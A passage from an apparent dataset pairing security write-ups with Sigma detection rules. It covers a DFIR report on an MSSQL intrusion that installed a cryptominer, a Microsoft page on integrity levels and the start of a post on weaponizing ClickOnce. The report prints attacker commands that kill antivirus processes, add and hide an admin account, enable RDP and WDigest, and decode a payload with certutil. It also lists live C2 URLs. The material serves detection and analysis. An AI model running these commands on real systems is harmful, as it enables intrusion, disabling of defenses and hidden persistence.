1.bat\n                1.bat performs the following\n                  Adding Local Administrator Accounts\n                  Hiding New Local Admin Accounts\n                  Enables RDP\n                  Enables Widget\n          Writes kit.bat to disk\n            Running XMRig CoinMiner\n              Creating scheduled task for CoinMiner\n      Compiling BMOF file\n        Adding a new class/ MyASEventConsumer in WMI repository\n          EventConsumer (Script or executable to run)\n            Creates persistence\n            Download/executes VBE script\n              - Random Name\n              - Executes every day at 23:00\n          EventFilter (Trigger condition)\n          Binding (Tie together Filter + Consumer)\n    Kills AV Processes\n```\n\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457 captures this as an `xp_cmdshell` event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using `taskkill` for various anti-virus software.\n\n### Commands to kill AV processes:\n\n```\ntaskkill /f /im egui.exe\ntaskkill /f /im QQPCTray.exe\ntaskkill /f /im SafeDogGuardCenter.exe\ntaskkill /f /im 360safe.exe\ntaskkill /f /im net1895.exe\ntaskkill /f /im ekrn.exe\ntaskkill /f /im 360rp.exe\ntaskkill /f /im QQPCMgr.exe\ntaskkill /f /im SafeDogServerUI.exe\ntaskkill /f /im SafeDogSiteIIS.exe\n```\n\nThe threat actors also favored the execution of batch scripts on the compromised host. They used `xp_cmdshell` to write a batch script (`1.bat`) to disk by redirecting strings to the file using `echo` commands.\n\n```image\nAlt: Batch Script Creation\nDescription: The image displays a table detailing a process execution log from a cybersecurity incident. It includes columns for 'Initiating Process File Name', 'Action Type', 'Initiating Process Command Line', 'Initiating Process Account Name', and 'File Name'. The table shows that 'cmd.exe' initiated a file creation action, specifically creating a batch file named '1.bat'. The command line executed involves various administrative commands, such as adding a user to local groups and modifying registry entries.\nTranscription: |\n  | Initiating Process File Name | Action Type | Initiating Process Command Line| Initiating Process Account Name | File Name |\n  | ---------------------------- | ----------- || ------------------------------- | --------- |\n  | cmd.exe                      | FileCreated | \"cmd.exe\" /c (echo NET USER Admin\\$ !67hC5140Rvg /ADD /expires:never & echo NET LOCALGROUP Administrators /ADD Admin\\$ & REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v SpecialAccounts\\Userlist /t REG_DWORD /d 0 & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f & echo reg add \"HKLM\\LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d 0 /f & echo NET LOCALGROUP Administrators /ADD Admin\\$ & echo NET LOCALGROUP Administrators /ADD Admin\\$ > %USERPROFILE%\\AppData\\1.bat | mssql$sqlexpress                | 1.bat     |\n```\n\nA second set of commands was also echoed into a file named `bigfile.txt`. Once complete, `certutil` was used to decode the text and create an executable file.\n\n### Certutil command:\n\n```\ncmd.exe /c certutil -decode %USERPROFILE%\\AppData\\bigfile.txt %USERPROFILE%\\AppData\\bigfile.exe\n```\n\nThis executable was then used in executing the `1.bat` batch file.\n\n### Command to execute batch file:\n\n```\ncmd.exe /c %USERPROFILE%\\AppData\\bigfile.exe -i -c %USERPROFILE%\\AppData\\1.bat\n```\n\nPulling the hash of the file that was written matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner: \nhttps://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\n\n```image\nAlt: THOR Scanner\nDescription: The image displays a screenshot from the THOR APT Scanner, detailing YARA signature matches for various hacking tools and indicators. It includes specific rules like 'Hacktool_Inject_Incognito' and 'Hacktool_Privilege_Escalation_Jan22_1,' with links to their descriptions and detection information. Detection timestamps and AV detection rates (e.g., 8/67) are also provided, indicating the effectiveness of the rules in identifying malicious activity.\nTranscription: |\n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Inject_Incognito\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Inject_Incognito\n  DESCRIPTION: Detects hacktool incognito\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_inject_incognito\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: Hacktool_Incognito_av\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/Hacktool_Incognito_av\n  DESCRIPTION: Detects Hacktool Incognito Av\n  REFERENCE: https://www.virustotal.com/en/file/18e64d4c240f6481e7bd542f6c8acc802549d437ec0018e10a3b0b6f675d/analysis/\n  RULE_AUTHOR: Florian Roth\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 8 / 67\n  \n  Use these tags to search for similar matches: #hacktool #incognito #hacktool_incognito_av\n  More information: https://www.nextron-systems.com/notes-on-virustotal-matches/\n  \n  ---\n  \n  thor\n  1 month ago\n  \n  YARA Signature Match - THOR APT Scanner\n  \n  RULE: HKTK_Inject_Privilege_Escalation_Jan22_1\n  RULE_SET: Livehunt - Hacktools Indicators ⚔️\n  RULE_TYPE: VALHALLA rule feed only\n  RULE_LINK: https://valhalla.nextron-systems.com/info/rule/HKTK_Inject_Privilege_Escalation_Jan22_1\n  DESCRIPTION: Detects a hacktool that seems to provide privilege escalation vectors\n  RULE_AUTHOR: Florian Roth\n  \n  👋 Hey, this seems to be an open-source tool or framework. The author has shared it with the community with the intention to improve overall security. If you are a victim and noticed this tool in a breach, please visit the tool's github page (see above) and tell your story by creating an issue on the issues page: https://github.com/KaLendis/CVE-2022-21882/issues ❤️.\n  \n  Detection Timestamp: 2022-06-07 23:44\n  AV Detection Ratio: 6 / 67\n```\n\nWe believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\n\n---\n\n## Persistence\n\nThe threat actors wrote a batch script (`1.bat`) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\n\n### Commands to create and add user:\n```\nNET USER Adminv$ !67hCS14ORVg /ADD /expires:never\nNET LOCALGROUP Administrators /ADD Adminv$\n```\n\nThey also made remote RDP connections possible by changing the `fDenyTSConnections` and `UserAuthentication` values to `0`.\n\n### Commands to enable RDP:\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-TCP\" /v UserAuthentication /t REG_DWORD /d \"0\" /f\n```\n\nThe full contents of `1.bat` also included commands to hide the user account by adding it to the registry using \"Special Accounts\".\n\n### Command to hide user account:\n```\nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v Adminv$ /t REG_DWORD /d 0\n```\n\n---\n\n## Credential Access\n\nDuring the initial access, credentials were obtained via a brute-force attack against the exposed MSSQL server. No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.\n\n---\n\n## Command and Control\n\nWe observed that the domain `mymst007[.]info` is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\n\n```image\nAlt: Connections\nDescription: The image is a detailed diagram illustrating the connections and communications related to the domain 'mymst007.info'. It includes nodes representing contacted IPs, domains, downloaded files, and URLs, along with specific filenames such as 'CSRSS.exe' and 'weixin.html'. The diagram visually maps out the relationships and interactions between these elements, highlighting the command and control infrastructure associated with the observed cyber attacks.\nTranscription: |\n  - Resolutions\n    - mst.mymst007.info\n    - mst2.mymst007.info\n  - Siblings\n  - Contacted ips\n  - Contacted domains\n  - Communicating files\n  - Downloaded files\n    - weixin.html\n  - Referrer files\n    - 3f14dc75982f1abd67e66623c5c8277b8d109be96b6f8fef92e4c0be7b2c9b1\n    - wrmi-instance-script.txt (1e4fdd4670ddb98286ed18bb3940c812215b2e5bda0886589e397667000391f)\n    - 563d381d5f8c7fecc6bd8e228cdf8beccab81fe5b1cfb29ddc34dc779e70e1\n    - 1c496854a393f70196745be19e47d758d50df22e2ed3c247a2008576105f\n  - Contacted urls\n    - http://mst2.mymst007.info/\n    - http://mst2.mymst007.info:4000/ver\n    - http://mst.mymst007.info/\n    - http://mst.mymst007.info:8080/all.dll.asp\n    - http://mst.mymst007.info/perp2017/home2/pergavr2017/a.exe\n  - CSRSS.exe\n```\n\n---\n\n## Impact\n\nThe impact was concentrated on this one host. We did not see any further activity in this case. The compromised host had XMRig miner installed and running. The miner was also connecting to cryptomining pools such as `minergate[.]com`.\n\n---\n\n## Indicators\n\n### File\n\n```\nWinRing0x64.sys\n0c0195c48b6b8582fa6f6373032118da\nd25340ae8e92a6d29f599fef426a2bc1b5217299\n11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5\n\nex.exe\na7bafac5ed29a68e0fff6eecc3f5bb3f\n4f19b6970e35b3d20f84a91e3af0d82c68096710\n428d06c889b17d5f95f9df952fc13b1cdd8ef520c51e2abff2f9192aa78a4b24\n\nkit.bat\n91931a2b1ae645004023e1b35fe57314\n9f5a7a293c92ef42374cf1471b653ed994446c15\n4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\n\nsmss.exe\ne579cd176b384b38eda6a0c61c51c274\n8a3b31ac12d9ac1a44707b1de75b8870189db83a\nd3c3f529a09203a839b41cd461cc561494b432d810041d71d41a66ee7d285d69\n\nxit\n88fba011db6e5122f4aa2c0343e11275\na2d34aeee2fb7c1ba57a11c03cc33e76f1217548\ncfa12bb31d58d30875b7a20ed05b5c100032b6a18802fbdf3913e70288e11a55\n\nxitmf\n0c8622c4871541e89d0173d5be0db8aa\nb01a88df39857417233d9bd3256f82d0fdcc63f8\nbeda317d74b8f1090e251205064e686d330a0502006a54dc94d528d6bd16c416\n```\n\n### Network\n\n```\nminergate[.]com\nmymst007[.]info\nbj87670@gmail.com\n```\n\n---\n\n## Detections\n\n### Sigma Rules\n\n- Suspicious Commands by SQL Server\n- MOFComp Execution\n- Hiding Local User Accounts\n\n### Yara Rules\n\n```\nrule miner_batch {\n   meta:\n      description = \"file kit.bat\"\n      author = \"TheDFIRReport\"\n      reference = \"https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\"\n      date = \"2022/07/10\"\n      hash1 = \"4905b7776810dc60e710af96a7e54420aaa15467ef5909b260d9a9bc46911186\"\n   strings:\n      $a1 = \"%~dps0\" fullword ascii\n      $a2 = \"set app\" fullword ascii\n      $a3 = \"cd /d \\\"%~dps0\\\"\" fullword ascii\n      $a4 = \"set usr=jood\" fullword ascii\n      $s1 = \"schtasks /run\" fullword ascii\n      $s2 = \"schtasks /delete\" fullword ascii\n      $a5 = \"if \\\"%1\\\"==\\\"-s\\\" (\" fullword ascii\n   condition:\n      uint16(0) == 0xfeff and filesize < 1KB and\n      3 of ($a*) and 1 of ($s*)\n}\n```\n\n---\n\n## MITRE Techniques\n\n```\nT1053.005 - Scheduled Task/Job: Scheduled Task\nT1136.001 - Create Account: Local Account\nT1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription\nT1564.002 - Hide Artifacts: Hidden Users\nT1059.003 - Command and Scripting Interpreter: Windows Command Shell\nT1027.004 - Obfuscated Files or Information: Compile After Delivery\nT1110.001 - Brute Force: Password Guessing\nT1070.004 - Indicator Removal on Host: File Deletion\nT1562.001 – Impair Defenses: Disable or Modify Tools\nT1546.012 - Event Triggered Execution: Image File Execution Options Injection\nT1140 - Deobfuscate/Decode Files or Information\nT1112 - Modify Registry\nT1078 - Valid Accounts\nT1134.001 - Token Impersonation/Theft\n```",
    "sigma_rule": {
      "title": "Potentially Suspicious CMD Shell Output Redirect",
      "id": "8e0bb260-d4b2-4fff-bb8d-3f82118e6892",
      "related": [
        {
          "id": "aa2efee7-34dd-446e-8a37-40790a66efd7",
          "type": "derived"
        },
        {
          "id": "4f4eaa9f-5ad4-410c-a4be-bc6132b0175a",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects inline Windows shell commands redirecting output via the \">\" symbol to a suspicious location.\nThis technique is sometimes used by malicious actors in order to redirect the output of reconnaissance commands such as \"hostname\" and \"dir\" to files for future exfiltration.\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains": [
            ">?%APPDATA%\\",
            ">?%TEMP%\\",
            ">?%TMP%\\",
            ">?%USERPROFILE%\\",
            ">?C:\\ProgramData\\",
            ">?C:\\Temp\\",
            ">?C:\\Users\\Public\\",
            ">?C:\\Windows\\Temp\\"
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains": [
            " >",
            "\">",
            "'>"
          ],
          "CommandLine|contains|all": [
            "C:\\Users\\",
            "\\AppData\\Local\\"
          ]
        },
        "condition": "selection_img and 1 of selection_cli_*"
      },
      "falsepositives": [
        "Legitimate admin or third party scripts used for diagnostic collection might generate some false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_redirection_susp_folder.yml",
    "id": "110"
  },
  {
    "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control",
    "markdown": "# Mandatory Integrity Control\n\nMandatory Integrity Control (MIC) provides a mechanism for controlling access to securable objects. This mechanism is in addition to discretionary access control and evaluates access before access checks against an object's discretionary access control list (DACL) are evaluated.\n\nMIC uses integrity levels and mandatory policy to evaluate access. Security principals and securable objects are assigned integrity levels that determine their levels of protection or access. For example, a principal with a low integrity level cannot write to an object with a medium integrity level, even if that object's DACL allows write access to the principal.\n\nWindows defines four integrity levels: low, medium, high, and system. Standard users receive medium, elevated users receive high. Processes you start and objects you create receive your integrity level (medium or high) or low if the executable file's level is low; system services receive system integrity. Objects that lack an integrity label are treated as medium by the operating system; this prevents low-integrity code from modifying unlabeled objects. Additionally, Windows ensures that processes running with a low integrity level cannot obtain access to a process which is associated with an app container.\n\n## Integrity Labels\n\nIntegrity labels specify the integrity levels of securable objects and security principals. Integrity labels are represented by integrity SIDs. The integrity SID for a securable object is stored in its system access control list (SACL). The SACL contains a SYSTEM_MANDATORY_LABEL_ACE access control entry (ACE) that in turn contains the integrity SID. Any object without an integrity SID is treated as if it had medium integrity.\n\nThe integrity SID for a security principal is stored in its access token. An access token may contain one or more integrity SIDs.\n\nFor detailed information about the defined integrity SIDs, see Well-known SIDs.\n\n## Process Creation\n\nWhen a user attempts to launch an executable file, the new process is created with the minimum of the user integrity level and the file integrity level. This means that the new process will never execute with higher integrity than the executable file. If the administrator user executes a low integrity program, the token for the new process functions with the low integrity level. This helps protect a user who launches untrustworthy code from malicious acts performed by that code. The user data, which is at the typical user integrity level, is write-protected against this new process.\n\n## Mandatory Policy\n\nThe SYSTEM_MANDATORY_LABEL_ACE ACE in the SACL of a securable object contains an access mask that specifies the access that principals with integrity levels lower than the object are granted. The values defined for this access mask are **SYSTEM_MANDATORY_LABEL_NO_WRITE_UP**, **SYSTEM_MANDATORY_LABEL_NO_READ_UP**, and **SYSTEM_MANDATORY_LABEL_NO_EXECUTE_UP**. By default, the system creates every object with an access mask of **SYSTEM_MANDATORY_LABEL_NO_WRITE_UP**.\n\nEvery access token also specifies a mandatory policy that is set by the Local Security Authority (LSA) when the token is created. This policy is specified by a TOKEN_MANDATORY_POLICY structure associated with the token. This structure can be queried by calling the GetTokenInformation function with the value of the _TokenInformationClass_ parameter set to **TokenMandatoryPolicy**.",
    "sigma_rule": {
      "title": "Suspicious High IntegrityLevel Conhost Legacy Option",
      "id": "3037d961-21e9-4732-b27a-637bcc7bf539",
      "status": "test",
      "description": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
      "references": [
        "https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29",
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
      ],
      "author": "frack113",
      "date": "2022-12-09",
      "modified": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "IntegrityLevel": [
            "High",
            "S-1-16-12288"
          ],
          "CommandLine|contains|all": [
            "conhost.exe",
            "0xffffffff",
            "-ForceV1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Very Likely, including launching cmd.exe via Run As Administrator"
      ],
      "level": "informational"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_conhost_legacy_option.yml",
    "id": "116"
  },
  {
    "url": "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
    "markdown": "# Less SmartScreen More Caffeine: (Ab)Using ClickOnce for Trusted Code Execution\n\nThe contents of this blogpost was written by Nick Powers (@zyn3rgy) and Steven Flores (@0xthirteen), and is a written version of the content presented at Defcon30.\n\nWith the barrier to entry for initial access ever increasing, we spent some time digging into potentially lesser-known weaponization options for ClickOnce deployments. A few of the hurdles we’d like to overcome by implementing these weaponization options include:\n\n- Install / execute application without administrative privileges\n- Reputable, known-good file(s) used during execution\n- Streamlined, minimal user interaction required\n- Ease of rerolling execution implementations\n\nUltimately, we want to take a relatively common initial access technique known as ClickOnce and extend its value for the offensive use case by abusing the trust of third-party applications.\n\n---\n\n## ClickOnce Overview and Current Weaponizations\n\n> “ClickOnce is a deployment technology that enables you to create self-updating Windows-based applications that can be installed and run with minimal user interaction” - MSDN\n\nClickOnce is a vehicle for installing and updating .NET applications. Deployments can be published through a variety of options (e.g. network file shares, legacy media [CD-ROM], and web pages). We will be focusing on the web page method of publishing deployments. Legitimate applications exist and make use of ClickOnce deployments for installation or updating software such as Chrome (previously), Fidelity, and others.\n\nClickOnce deployments rely on manifests which are formatted in a very specific way. Just like .NET applications, there will be different types of manifests that need to be accounted for. There are three types of manifest to become familiar with when discussing ClickOnce deployments:\n\n> ClickOnce deployment manifests\n\n- *.application is the file extension for these\n- References the ClickOnce application manifest to deploy\n- APPREF-MS file will point to this (if used)\n\n> ClickOnce application manifests\n\n- *.exe.manifest is the file extension for these\n- Specifies dependencies for the deployment (states version of .NET that will be utilized)\n- Conducts integrity check of deployment manifest\n- References to dependencies and other files for delivery\n\n> Embedded application and assembly manifests\n\n- Application manifest can also be called unmanaged or fusion manifest\n- Assembly manifest can also be called managed manifest\n- At runtime, ClickOnce makes comparisons against these\n\n```image\nAlt: Embedded Assembly Manifest\nDescription: The image displays a segment of code written in C# that is related to .NET assembly attributes. It includes various assembly attributes like AssemblyVersion, AssemblyTitle, AssemblyDescription, and others which are essential for defining the properties and metadata of a .NET assembly. The code snippet also contains references to the system's configuration settings and assemblies needed for the execution of the program, specifically a tool named 'CasPol.exe' which is part of the .NET Framework.\nTranscription: |\n  // C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe\n  // caspol, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  // Entry point: Microsoft.Tools.caspol.caspol.Main\n  // Timestamp: SDD4A1DE (11/4/2019 8:39:58 AM)\n  \n  using System;\n  using System.Diagnostics;\n  using System.Reflection;\n  using System.Resources;\n  using System.Runtime.CompilerServices;\n  using System.Runtime.InteropServices;\n  \n  [assembly: AssemblyVersion(\"4.0.0.0\")]\n  [assembly: CompilationRelaxations(8)]\n  [assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]\n  [assembly: ComVisible(false)]\n  [assembly: CLSCompliant(true)]\n  [assembly: AssemblyTitle(\"caspol.exe\")]\n  [assembly: AssemblyDescription(\"caspol.exe\")]\n  [assembly: AssemblyCompany(\"Microsoft Corporation\")]\n  [assembly: AssemblyProduct(\"Microsoft .NET Framework\")]\n  [assembly: AssemblyCopyright(\"@ Microsoft Corporation. All rights reserved.\")]\n  [assembly: AssemblyFileVersion(\"4.8.4084.0\")]\n  [assembly: AssemblyInformationalVersion(\"4.8.4084.0\")]\n  [assembly: SatelliteContractVersion(\"4.0.0.0\")]\n  [assembly: NeutralResourcesLanguage(\"en-US\")]\n  [assembly: AssemblyDelaySign(true)]\n  [assembly: AssemblyKeyFile(@\"..\\..\\tools\\devdiv\\FinalPublicKey.snk\")]\n  [assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]\n  [assembly: DefaultDllImportSearchPaths(DllImportSearchPath.System32 | DllImportSearchPath.AssemblyDirectory)]\n```\n\n```image\nAlt: Embedded Application Manifest\nDescription: The image displays an XML manifest file for a ClickOnce application. It includes various sections such as the XML version, encoding, and application identity. Key elements include security settings, compatibility information, and application details. The manifest specifies requested privileges and execution levels, indicating that the application is designed to run with minimal user interaction and detail the supported operating systems.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n  <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\">\n    <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\n    <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\n      <security>\n        <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\n          <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>\n        </requestedPrivileges>\n      </security>\n    </trustInfo>\n    <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\n      <application>\n        <!-- This ID below indicates app support for Windows 7 -->\n        <supportedOS Id=\"{3313b89a-5d96-4fbd-8e2d-a2440225f93a}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{42af2e83-533b-4441-ba9c-d694da4a6e38}\"/>\n        <!-- The ID below indicates app support for Windows Developer Preview and appears to be the latest for Win8 -->\n        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>\n      </application>\n    </compatibility>\n  </assembly>\n```\n\n```image\nAlt: ClickOnce Deployment Manifest, Executable, and Application Manifest\nDescription: The image displays a file directory structure related to a ClickOnce deployment. It shows the folder 'Clickonce_Demo1' containing three files: 'Clickonce_Demo1.application', 'Click_Demo1.exe.deploy', and 'Click_Demo1.exe.manifest'. Each file has a date modified timestamp of '4/19/2022 9:35 PM' and indicates their respective types—Application Manifest, DEPLOY File, and MANIFEST File—with sizes of 6 KB and 7 KB. This structure is relevant for understanding ClickOnce deployment manifests as discussed in the accompanying text.\nTranscription: |\n  Name                            Date modified        Type                    Size\n  Clickonce_Demo1.application     4/19/2022 9:35 PM    APPLICATION Manifest    6 KB\n  Clickonce_Demo1.exe.deploy      4/19/2022 9:35 PM    DEPLOY File             6 KB\n  Clickonce_Demo1.exe.manifest    4/19/2022 9:35 PM    MANIFEST File           7 KB\n```\n\nClickOnce applications can be deployed to a client by visiting the *.application deployment manifest using a browser. The download and execution process of a standard ClickOnce deployment requires the end user to be using a Microsoft Edge or Internet Explorer browser. An alternative to requiring the target user to access your deployment manifest from either Edge or Internet Explorer would be to leverage APPREF-MS. When creating an *.appref-ms file, UTF-16 LE encoding is required. An appref-ms file would be used if the end user is using something like Chrome or Firefox to access the application.\n\n> **NOTE:** A simple user-agent check can be done prior to reaching the landing page to determine whether the incoming request should be pointed towards the standard deployment manifest or an appref-ms file.\n\nThe host assembly, specified in the manifest, will spawn as a child process of ‘dfsvc.exe’, which handles the ClickOnce deployment functionality that is imported from ‘System.Deployment.dll’. The contents of the ClickOnce application manifest will specify what dependencies and other resources will be delivered during the deployment process. The contents of the deployment will ultimately be saved to:\n\n> `C:\\Users\\%USERNAME%\\AppData\\Local\\Apps\\2.0\\<randomstring>`\n\nOnce a user has accepted to run the application, the deployment manifest will look to the ClickOnce application manifest for all the files that need to be downloaded.\n\n```image\nAlt: ClickOnce Deployment Manifest Example\nDescription: The image displays a snippet of XML code that represents a ClickOnce deployment manifest. It includes details about the compatible frameworks and a dependency assembly. Specifically, it highlights the codebase path to the manifest file of a ClickOnce application, along with its version, public key token, and processor architecture. This information is crucial for understanding how the ClickOnce deployment mechanism operates.\nTranscription: |\n  <compatibleFrameworks xmlns=\"urn:schemas-microsoft-com:clickonce.v2\">\n      <framework targetVersion=\"4.7.2\" profile=\"full\" supportedRuntime=\"4.0.30319\" />\n  </compatibleFrameworks>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" codebase=\"Application Files\\ClickOnce_1.1.07.13875\\ClickOnce.exe.manifest\" size=\"55369\">\n          <assemblyIdentity name=\"ClickOnce.exe\" version=\"1.1.07.13875\" publicKeyToken=\"0000000000000000\" language=\"neutral\" processorArchitecture=\"msil\" type=\"win32\" />\n      </dependentAssembly>\n  </dependency>\n```\n\nThere will be different pieces of information located throughout the manifest that look very similar to .NET application manifests. This will contain all of the files and dependencies the deployment will need to execute properly.\n\n```image\nAlt: ClickOnce Application Manifest Example\nDescription: The image displays a code snippet that appears to be an XML representation of a ClickOnce deployment manifest. It includes various `dependency` and `file` elements, each detailing the properties of the assemblies and files required for the application. The `dependentAssembly` sections specify the `assemblyIdentity` with attributes such as `dependencyType`, `codebase`, `version`, and `size`, indicating the dependencies needed for the application to function correctly. The `file` elements list specific files included in the deployment, along with their names and sizes.\nTranscription: |\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"GRBase.dll\" size=\"1283072\">\n          <assemblyIdentity name=\"GRBase\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"GRPrincipal.dll\" size=\"146432\">\n          <assemblyIdentity name=\"GRPrincipal\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"Infra.dll\" size=\"68096\">\n          <assemblyIdentity name=\"Infra\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <dependency>\n      <dependentAssembly dependencyType=\"install\" allowDelayedBinding=\"true\" codebase=\"WebserviceClients.dll\" size=\"508416\">\n          <assemblyIdentity name=\"WebserviceClients\" version=\"1.1.7.13875\" language=\"neutral\" processorArchitecture=\"msil\" />\n      </dependentAssembly>\n  </dependency>\n  <file name=\"CCe.zip\" size=\"84771\" />\n  <file name=\"ClickOnce.exe.config\" size=\"31570\" />\n  <file name=\"NFe.zip\" size=\"1646533\" />\n  <file name=\"Resources/clickOnce.ico\" size=\"113799\" />\n  <file name=\"Resources/globe.ico\" size=\"67646\" />\n  <file name=\"Resources/logo.png\" size=\"67646\" />\n```\n\nThe dfsvc process will make a series of HTTP requests for the downloads and save in the %LocalAppData% location mentioned above.\n\n```image\nAlt: HTTP Requests While Downloading a ClickOnce Application\nDescription: The image displays a series of HTTP GET requests as seen in a network monitoring tool or terminal. Each line represents a request for various files associated with a ClickOnce application deployment, including manifests, images, and DLLs. The requests indicate the retrieval of components necessary for the installation and execution of a .NET application using ClickOnce technology.\nTranscription: |\n  \"GET /clickonce.html HTTP/1.1\"\n  \"GET /ClickOnce.application HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.manifest HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/ClickOnce.ico.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/globe.ico.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/CCe.zip.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Resources/logo.png.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/NFe.zip.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/ClickOnce.exe.config.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/Infra.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GRBase.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GRPrincipal.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/WebserviceClients.dll.deploy HTTP/1.1\"\n  \"GET /Application%20Files/ClickOnce_1_1_07_13875/GR.Presentation.Infra.dll.deploy 